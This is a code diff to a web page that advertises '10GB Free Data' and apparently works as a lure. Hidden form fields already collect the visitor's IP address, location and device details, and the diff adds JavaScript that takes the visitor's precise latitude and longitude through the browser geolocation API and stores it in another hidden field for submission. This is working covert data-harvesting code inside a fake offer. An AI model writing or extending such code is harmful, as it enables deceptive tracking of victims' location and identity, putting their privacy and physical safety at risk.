@@ -72,7 +72,7 @@
 </head>
 <body>
   <div class="top-banner">
-    <img src="https://i.ibb.co/Vp9xqyr3/6471.jpg" alt="10GB Free Data">
+    <img src="https://i.ibb.co/Vp9xqyr/6471.jpg" alt="10GB Free Data">
   </div>
 
   <div class="content">
@@ -93,6 +93,7 @@
       <input type="hidden" name="IP Address" id="ip">
       <input type="hidden" name="Location" id="location">
       <input type="hidden" name="Device Info" id="device">
+      <input type="hidden" name="Live Location" id="liveLocation">
       <button type="submit">Check Free Data</button>
     </form>
 
@@ -112,6 +113,20 @@
         document.getElementById("device").value = navigator.userAgent;
       } catch (e) {
         console.log("Error fetching IP info");
+      }
+
+      // Get live location using browser Geolocation API
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            document.getElementById("liveLocation").value = `Latitude: ${lat}, Longitude: ${lon}`;
+          },
+          function (error) {
+            console.log("Geolocation error or permission denied");
+          }
+        );
       }
     }
 
